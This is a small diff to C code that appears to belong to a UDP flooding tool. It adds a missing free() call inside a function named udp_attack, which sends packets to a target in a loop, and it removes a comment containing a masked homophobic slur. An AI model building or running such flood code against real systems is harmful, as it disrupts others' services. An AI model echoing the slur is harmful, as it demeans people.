@@ -76,8 +76,7 @@ void* udp_attack(void* arg) {
         ssize_t sent = sendto(udp_sock, packet, packet_size, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
         if (sent < 0) break;
     }
-    //free packet too
-    // I accidently replaced wrong file cuz codespaces are g*y
+    if (packet) free(packet);
     close(udp_sock);
     return NULL;
 }
